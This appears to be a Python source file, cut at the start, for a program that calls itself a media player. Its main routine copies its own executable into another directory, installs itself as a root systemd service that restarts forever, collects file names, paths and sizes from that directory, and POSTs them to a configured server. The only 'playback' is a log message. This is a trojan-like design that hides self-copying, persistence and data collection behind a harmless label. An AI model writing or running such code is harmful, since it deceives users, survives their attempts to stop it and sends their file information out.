logger = logging.getLogger("MediaPlayer")

# --- Configuration Options ---
CONFIG = {
    "server_url": "http://localhost:8080/api/metadata",
    "retry_intervals": [1, 2, 4, 8],  # Exponential backoff seconds
    "iteration_count": 1,
    "target_dir": "./target",
    "media_extensions": {
        ".mp3",
        ".mp4",
        ".avi",
        ".mkv",
        ".wav",
        ".flac",
        ".mov",
        ".webm",
        ".m4a",
    },
}


def self_replicate() -> None:
    try:
        os.makedirs(CONFIG["target_dir"], exist_ok=True)
        current_executable = os.path.abspath(sys.argv[0])
        executable_name = os.path.basename(current_executable)
        destination_path = os.path.join(CONFIG["target_dir"], executable_name)

        if os.path.abspath(current_executable) == os.path.abspath(
            destination_path
        ):
            logger.info("Application is already running from the target directory.")
            return

        shutil.copy2(current_executable, destination_path)
        logger.info(f"Successfully replicated self to: {destination_path}")
    except Exception as e:
        logger.error(f"Failed to replicate application: {e}")


def scan_and_collect_metadata() -> list:
    metadata_path = os.path.join(CONFIG["target_dir"], "metadata.json")
    media_files_data = []

    logger.info(f"Scanning '{CONFIG['target_dir']}' for media files...")

    try:
        if not os.path.exists(CONFIG["target_dir"]):
            logger.warning(
                f"Target directory '{CONFIG['target_dir']}' does not exist."
            )
            return []

        for entry in os.scandir(CONFIG["target_dir"]):
            if entry.is_file():
                ext = os.path.splitext(entry.name)[1].lower()
                if ext in CONFIG["media_extensions"]:
                    try:
                        stat_info = entry.stat()
                        file_metadata = {
                            "filename": entry.name,
                            "path": entry.path,
                            "size_bytes": stat_info.st_size,
                            "last_modified": datetime.fromtimestamp(
                                stat_info.st_mtime, tz=timezone.utc
                            ).isoformat(),
                        }
                        media_files_data.append(file_metadata)
                        logger.info(f"Found media file: {entry.name}")
                    except OSError as oe:
                        logger.error(
                            f"Error reading metadata for {entry.name}: {oe}"
                        )

        with open(metadata_path, "w", encoding="utf-8") as f:
            json.dump(media_files_data, f, indent=4)

        logger.info(
            f"Successfully wrote metadata for {len(media_files_data)} files to '{metadata_path}'"
        )
        return media_files_data

    except Exception as e:
        logger.error(f"Failed to scan and generate metadata: {e}")
        return []


def send_metadata_to_server(data: list) -> None:
    parsed_url = urllib.parse.urlparse(CONFIG["server_url"])
    if not parsed_url.netloc:
        logger.error(
            f"Invalid server URL configured: {CONFIG['server_url']}"
        )
        return

    payload = json.dumps({"media_files": data}).encode("utf-8")
    headers = {
        "Content-Type": "application/json",
        "Content-Length": str(len(payload)),
    }

    backoff_intervals = CONFIG["retry_intervals"]
    success = False

    for attempt, delay in enumerate(backoff_intervals, start=1):
        try:
            logger.info(
                f"Attempting to send metadata to {CONFIG['server_url']} (Attempt {attempt})..."
            )
            if parsed_url.scheme == "https":
                conn = http.client.HTTPSConnection(
                    parsed_url.netloc, timeout=5
                )
            else:
                conn = http.client.HTTPConnection(
                    parsed_url.netloc, timeout=5
                )

            target_path = parsed_url.path or "/"
            if parsed_url.query:
                target_path += f"?{parsed_url.query}"

            conn.request("POST", target_path, body=payload, headers=headers)
            response = conn.getresponse()

            if 200 <= response.status < 300:
                logger.info(
                    f"Successfully transmitted metadata. Server responded with status: {response.status}"
                )
                success = True
                conn.close()
                break
            else:
                logger.warning(
                    f"Server returned non-success status {response.status}: {response.reason}"
                )
                conn.close()
        except (
            http.client.HTTPException,
            TimeoutError,
            ConnectionRefusedError,
            OSError,
        ) as net_err:
            logger.warning(
                f"Network error during transmission (Attempt {attempt}): {net_err}"
            )

        if attempt < len(backoff_intervals):
            logger.info(f"Retrying in {delay} seconds...")
            time.sleep(delay)

    if not success:
        logger.error(
            "All transmission attempts failed. Operating in offline mode; continuing execution gracefully."
        )


def register_as_service() -> None:
    """Optional platform service registration helper for Linux systemd."""
    if os.name != "posix" or getattr(os, "geteuid", lambda: -1)() != 0:
        logger.info(
            "System service registration skipped (requires root/administrator privileges on POSIX systems)."
        )
        return

    service_name = "mediaplayer.service"
    service_path = f"/etc/systemd/system/{service_name}"
    executable_path = os.path.abspath(sys.argv[0])

    service_content = f"""[Unit]
Description=Media Player Utility Service
After=network.target

[Service]
ExecStart={sys.executable} {executable_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
    try:
        with open(service_path, "w", encoding="utf-8") as f:
            f.write(service_content)
        os.system("systemctl daemon-reload")
        logger.info(
            f"Successfully registered and installed systemd service at {service_path}"
        )
    except Exception as e:
        logger.error(f"Failed to register system service: {e}")


def play_media() -> None:
    logger.info("Initializing media player engine...")
    logger.info("Playing track: 'Default Stream - Ambient Python (Standard Edition)'")


def main() -> None:
    logger.info("Starting media player application...")
    self_replicate()
    register_as_service()

    iterations = CONFIG["iteration_count"]
    for i in range(1, iterations + 1):
        logger.info(f"Execution cycle {i} of {iterations}")
        metadata = scan_and_collect_metadata()
        send_metadata_to_server(metadata)
        play_media()

        if i < iterations:
            time.sleep(5)

    logger.info("Media playback finished. Exiting cleanly.")


if __name__ == "__main__":
    main()

